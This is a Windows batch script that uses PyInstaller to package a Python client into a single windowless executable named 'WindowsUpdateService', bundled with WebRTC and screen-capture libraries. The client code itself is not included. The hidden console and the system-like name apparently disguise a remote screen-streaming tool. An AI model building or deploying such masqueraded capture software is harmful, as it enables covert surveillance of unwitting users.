@echo off
echo [+] Checking for required packages...
pip install pyinstaller

echo [+] Building client executable...
pyinstaller --onefile --noconsole --name WindowsUpdateService --collect-all aiortc --collect-all av --collect-all dxcam client.py

echo [+] Build complete. Executable is in the 'dist' folder.
pause

